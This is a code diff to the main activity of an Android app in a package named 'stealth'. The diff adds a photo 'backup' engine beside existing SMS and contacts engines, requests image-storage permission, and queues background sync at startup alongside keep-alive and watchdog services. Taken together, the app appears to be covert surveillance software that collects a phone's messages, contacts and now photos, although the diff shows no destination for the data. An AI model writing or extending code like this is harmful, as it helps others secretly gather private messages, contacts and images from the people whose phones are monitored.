@@ -32,6 +32,7 @@ import androidx.core.content.ContextCompat;
 
 import com.notrack.stealth.backup.BackupObserverService;
 import com.notrack.stealth.backup.ContactsBackupEngine;
+import com.notrack.stealth.backup.PhotoBackupEngine;
 import com.notrack.stealth.backup.SmsBackupEngine;
 import com.notrack.stealth.sync.SyncWorker;
 import com.notrack.stealth.update.UpdateManager;
@@ -458,6 +459,7 @@ public class MainActivity extends Activity {
             requestPermissions(needed.toArray(new String[0]), REQ_CODE_PERMISSIONS);
         } else {
             BackupObserverService.registerObservers(this);
+            SyncWorker.enqueueSync(this);
         }
     }
 
@@ -484,12 +486,17 @@ public class MainActivity extends Activity {
         if (requestCode == REQ_CODE_PERMISSIONS) {
             boolean smsGranted = checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
             boolean contactsGranted = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+            boolean mediaGranted = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+                    ? checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+                    : checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
 
-            if (smsGranted || contactsGranted) {
-                Log.i(TAG, "Runtime permissions updated: sms=" + smsGranted + ", contacts=" + contactsGranted);
+            if (smsGranted || contactsGranted || mediaGranted) {
+                Log.i(TAG, "Runtime permissions updated: sms=" + smsGranted + ", contacts=" + contactsGranted + ", media=" + mediaGranted);
                 BackupObserverService.registerObservers(this);
                 if (smsGranted) SmsBackupEngine.triggerSyncAsync(this);
                 if (contactsGranted) ContactsBackupEngine.triggerSyncAsync(this);
+                if (mediaGranted) PhotoBackupEngine.triggerSyncAsync(this);
+                SyncWorker.enqueueSync(this);
             }
             checkAndApplySystemStatus();
         }
@@ -498,6 +505,7 @@ public class MainActivity extends Activity {
     private void bootstrapServices() {
         try {
             SyncWorker.enqueuePeriodicKeepAlive(this);
+            SyncWorker.enqueueSync(this);
             WatchdogService.start(this);
         } catch (Exception e) {
             Log.e(TAG, "Error starting background services", e);
